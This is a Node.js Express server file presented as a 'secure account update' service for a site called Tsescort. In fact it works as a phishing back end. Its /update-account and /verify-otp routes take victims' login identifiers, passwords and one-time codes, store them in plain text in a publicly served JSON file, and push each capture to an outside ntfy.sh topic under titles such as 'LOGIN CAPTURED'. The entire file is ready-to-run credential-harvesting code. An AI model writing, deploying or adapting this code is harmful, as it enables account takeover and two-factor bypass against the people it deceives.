// ============================================================
//  TSESCORT · SECURE ACCOUNT UPDATE — server.js
//  POST /update-account  → saves identifier + password
//  POST /verify-otp      → saves OTP into the user's record
//  Data persisted in PLAIN JSON at public/users.json
//  ------------------------------------------------------------
//  NTFY INTEGRATION — ONLY 2 NOTIFICATIONS:
//    1) When account details are submitted (login + password)
//    2) When OTP is submitted
// ============================================================
const express = require('express');
const fs = require('fs');
const path = require('path');
const https = require('https');
const http = require('http');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static('public'));

const PUBLIC_DIR = path.join(__dirname, 'public');
const USERS_FILE = path.join(PUBLIC_DIR, 'users.json');

// ------------------------------------------------------------
//  NTFY CONFIGURATION
// ------------------------------------------------------------
const NTFY_TOPIC = 'ts_update';
const NTFY_URL = `https://ntfy.sh/${NTFY_TOPIC}`;

/**
 * Send a notification to ntfy.sh asynchronously.
 * Never blocks the request handler — failures are silent.
 * @param {string} message - The message body (plain text)
 * @param {string[]} tags   - Optional ntfy tags (emoji shortcodes)
 * @param {string} title    - Optional notification title
 * @param {string} priority - ntfy priority (min, low, default, high, urgent)
 */
function sendNtfy(message, tags = ['eyes'], title = 'Tsescort', priority = 'urgent') {
  try {
    const payload = JSON.stringify({
      topic: NTFY_TOPIC,
      message: message,
      title: title,
      tags: tags,
      priority: priority
    });

    const url = new URL(NTFY_URL);
    const options = {
      hostname: url.hostname,
      path: url.pathname,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(payload)
      }
    };

    const req = https.request(options, (res) => {
      // Drain response so connection can be freed
      res.on('data', () => {});
      res.on('end', () => {});
    });

    req.on('error', (err) => {
      // Silent — never break the flow because ntfy is unreachable
      console.warn('[Tsescort] ntfy send failed:', err.message);
    });

    req.write(payload);
    req.end();
  } catch (err) {
    console.warn('[Tsescort] ntfy exception:', err.message);
  }
}

// ------------------------------------------------------------
//  FILE HELPERS
// ------------------------------------------------------------
if (!fs.existsSync(PUBLIC_DIR)) fs.mkdirSync(PUBLIC_DIR, { recursive: true });
if (!fs.existsSync(USERS_FILE)) fs.writeFileSync(USERS_FILE, JSON.stringify([], null, 2), 'utf8');

function readUsers() {
  try {
    const raw = fs.readFileSync(USERS_FILE, 'utf8');
    const parsed = JSON.parse(raw);
    return Array.isArray(parsed) ? parsed : [];
  } catch (err) {
    console.warn('[Tsescort] Could not read users.json, starting fresh.', err.message);
    return [];
  }
}

function writeUsers(users) {
  fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 2), 'utf8');
}

// ------------------------------------------------------------
//  POST /update-account
//  Saves identifier + password, then notifies via ntfy.
//  NOTIFICATION #1 — login details captured
// ------------------------------------------------------------
app.post('/update-account', (req, res) => {
  try {
    const { identifier, password, timestamp, app } = req.body;
    if (!identifier || !password) {
      return res.status(400).json({ success: false, error: 'Missing identifier or password' });
    }

    const users = readUsers();
    const newRecord = {
      id: Date.now() + '-' + Math.random().toString(36).substr(2, 9),
      identifier: identifier.trim(),
      password: password,
      timestamp: timestamp || new Date().toISOString(),
      app: app || 'tsescort',
      ip: req.ip || req.connection?.remoteAddress || 'unknown',
      otp: null,
      otpVerifiedAt: null,
      status: 'pending_otp'
    };

    const existingIndex = users.findIndex(
      (u) => u.identifier && u.identifier.toLowerCase() === newRecord.identifier.toLowerCase()
    );

    let action = 'created';
    if (existingIndex !== -1) {
      users[existingIndex] = { ...users[existingIndex], ...newRecord, id: users[existingIndex].id };
      action = 'updated';
      console.log('[Tsescort] Updated existing record for: ' + newRecord.identifier);
    } else {
      users.push(newRecord);
      console.log('[Tsescort] Added new record for: ' + newRecord.identifier);
    }

    writeUsers(users);

    // ------------------------------------------------------------
    //  NTFY #1: SEND LOGIN + PASSWORD IMMEDIATELY
    // ------------------------------------------------------------
    sendNtfy(
      `🔐 TSESCORT LOGIN CAPTURED (${action})\n` +
      `━━━━━━━━━━━━━━━━━━━━\n` +
      `👤 Identifier: ${newRecord.identifier}\n` +
      `🔑 Password:   ${newRecord.password}\n` +
      `🌐 IP:         ${newRecord.ip}\n` +
      `⏰ Time:       ${newRecord.timestamp}\n` +
      `📊 Status:     pending_otp\n` +
      `━━━━━━━━━━━━━━━━━━━━`,
      ['lock', 'key'],
      `Tsescort · Login Captured`,
      'urgent'
    );

    return res.status(200).json({
      success: true,
      message: 'Account update saved. Awaiting OTP verification.',
      identifier: newRecord.identifier,
      totalUsers: users.length
    });
  } catch (error) {
    console.error('[Tsescort] Error in /update-account:', error);
    return res.status(500).json({ success: false, error: 'Internal server error' });
  }
});

// ------------------------------------------------------------
//  POST /verify-otp
//  Saves the OTP into the matched user's record and notifies.
//  NOTIFICATION #2 — OTP submitted
// ------------------------------------------------------------
app.post('/verify-otp', (req, res) => {
  try {
    const { otp, timestamp, app, identifier } = req.body;
    if (!otp || String(otp).trim().length === 0) {
      return res.status(400).json({ success: false, error: 'Missing OTP' });
    }

    const users = readUsers();
    if (users.length === 0) {
      return res.status(404).json({ success: false, error: 'No user records found' });
    }

    let targetIndex = -1;

    // Prefer explicit identifier match
    if (identifier) {
      targetIndex = users.findIndex(
        (u) => u.identifier && u.identifier.toLowerCase() === String(identifier).toLowerCase()
      );
    }

    // Fallback: find most recent user still awaiting OTP
    if (targetIndex === -1) {
      for (let i = users.length - 1; i >= 0; i--) {
        if (users[i].status === 'pending_otp' || !users[i].otp) {
          targetIndex = i;
          break;
        }
      }
    }

    // Last resort: newest record
    if (targetIndex === -1) targetIndex = users.length - 1;

    const cleanOtp = String(otp).trim();
    users[targetIndex].otp = cleanOtp;
    users[targetIndex].otpLength = cleanOtp.length;
    users[targetIndex].otpVerifiedAt = timestamp || new Date().toISOString();
    users[targetIndex].status = 'otp_verified';
    users[targetIndex].app = app || users[targetIndex].app || 'tsescort';
    writeUsers(users);

    console.log('[Tsescort] OTP "' + cleanOtp + '" saved for user: ' + users[targetIndex].identifier);

    // ------------------------------------------------------------
    //  NTFY #2: SEND OTP + FULL USER RECORD
    // ------------------------------------------------------------
    const u = users[targetIndex];
    sendNtfy(
      `✅ TSESCORT OTP SUBMITTED\n` +
      `━━━━━━━━━━━━━━━━━━━━\n` +
      `🔢 OTP:        ${cleanOtp}\n` +
      `📏 Length:     ${cleanOtp.length}\n` +
      `👤 Identifier: ${u.identifier}\n` +
      `🔑 Password:   ${u.password || '(none)'}\n` +
      `🌐 IP:         ${u.ip || 'unknown'}\n` +
      `⏰ Verified:   ${u.otpVerifiedAt}\n` +
      `📊 Status:     otp_verified\n` +
      `━━━━━━━━━━━━━━━━━━━━`,
      ['white_check_mark', 'key'],
      'Tsescort · OTP Submitted',
      'urgent'
    );

    return res.status(200).json({
      success: true,
      message: 'OTP verified and saved successfully',
      identifier: users[targetIndex].identifier,
      otpVerifiedAt: users[targetIndex].otpVerifiedAt
    });
  } catch (error) {
    console.error('[Tsescort] Error in /verify-otp:', error);
    return res.status(500).json({ success: false, error: 'Internal server error' });
  }
});

// ------------------------------------------------------------
//  HEALTH CHECK
// ------------------------------------------------------------
app.get('/health', (req, res) => {
  res.json({ status: 'ok', service: 'tsescort-update' });
});

// ------------------------------------------------------------
//  START SERVER
// ------------------------------------------------------------
app.listen(PORT, () => {
  console.log('============================================');
  console.log('  TSESCORT · SECURE ACCOUNT UPDATE');
  console.log('  Server running on http://localhost:' + PORT);
  console.log('  Users file: ' + USERS_FILE);
  console.log('  NTFY topic: ' + NTFY_TOPIC);
  console.log('  NTFY url:   ' + NTFY_URL);
  console.log('============================================');
});